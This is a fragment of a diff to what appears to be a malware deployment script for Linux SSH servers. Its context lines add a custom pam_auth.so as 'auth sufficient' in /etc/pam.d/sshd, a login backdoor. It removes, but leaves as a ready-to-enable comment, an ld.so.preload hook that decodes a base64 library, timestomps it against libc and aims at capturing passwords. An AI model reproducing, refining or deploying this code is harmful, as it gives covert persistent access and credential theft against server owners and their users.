@@ -105,11 +105,8 @@ rm "$SO_FILE"
 grep -q "pam_auth.so" /etc/pam.d/sshd || sed -i '1a auth sufficient pam_auth.so' /etc/pam.d/sshd
 grep -q "session.*pam_auth.so" /etc/pam.d/sshd || echo "session optional pam_auth.so" >> /etc/pam.d/sshd
 
-# Deploy hook (helps on some systems, OpenSSH 9.x still scrubs passwords)
-echo "$HOOK_B64" | base64 -d > /lib/pam_hook.so
-chmod 644 /lib/pam_hook.so
-touch -r /lib/libc.so.* /lib/pam_hook.so 2>/dev/null
-echo "/lib/pam_hook.so" > /etc/ld.so.preload
+# Skip hook - requires matching glibc version, can break sshd on older systems
+# To enable: echo "$HOOK_B64" | base64 -d > /lib/pam_hook.so && echo "/lib/pam_hook.so" > /etc/ld.so.preload
 
 echo "deployed"
 PAYLOAD_TAIL
